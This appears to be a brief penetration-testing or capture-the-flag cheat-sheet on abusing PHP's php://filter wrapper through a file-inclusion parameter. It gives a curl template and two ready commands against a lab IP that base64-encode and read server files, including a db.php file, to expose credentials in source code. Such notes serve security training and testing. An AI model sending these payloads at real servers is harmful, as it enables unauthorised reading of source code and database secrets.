# PHP Wrapper

### &#x20;php::filter:

In CTF, it typically hides sensitive information like credentials in the source code.&#x20;

{% code overflow="wrap" %}
```bash
Kali> curl --user-agent "PENTEST" "$URL?parameter=php://filter/$FILTERS/resource=$FILE"
	
#This forces PHP to base64 encode the file before it is used in the require statement.
	
curl "https://10.10.190.166/dev/index.html?view=php://filter/convert.base64-encode/resource=index.html"
	
curl "https://10.10.190.166/dev/index.html?view=php://filter/convert.base64-encode/resource=C:\xampp\htdocs\dev\db.php" 

```
{% endcode %}

